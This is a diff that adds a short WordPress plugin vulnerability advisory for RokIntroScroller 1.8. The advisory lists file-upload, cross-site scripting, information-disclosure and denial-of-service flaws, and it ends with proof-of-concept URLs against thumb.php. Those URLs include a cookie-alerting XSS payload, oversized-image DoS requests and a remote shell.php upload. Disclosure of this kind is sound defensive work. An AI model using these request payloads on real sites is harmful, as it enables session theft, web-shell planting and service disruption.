@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/62493/info
+
+The RokIntroScroller plugin for WordPress is prone to multiple security vulnerabilities, including:
+
+1. An arbitrary file-upload vulnerability
+2. A cross-site scripting vulnerability
+3. An information-disclosure vulnerability
+4. A denial-of-service vulnerability
+
+Attackers can exploit these issues to obtain sensitive information, upload arbitrary files, perform a denial-of-service attack, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+RokIntroScroller 1.8 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-content/plugins/wp_rokintroscroller/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg
+
+http://www.example.com/wp-content/plugins/wp_rokintroscroller/thumb.php?src=http://www.example2.com/page.png&h=1&w=1111111
+
+http://www.example.com/wp-content/plugins/wp_rokintroscroller/thumb.php?src=http://www.example2.com/big_file&h=1&w=1
+
+http://www.example.com/wp-content/plugins/wp_rokintroscroller/thumb.php?src=http://www.example2.com/shell.php
+
+http://www.example.com/wp-content/plugins/wp_rokintroscroller/rokintroscroller.php 
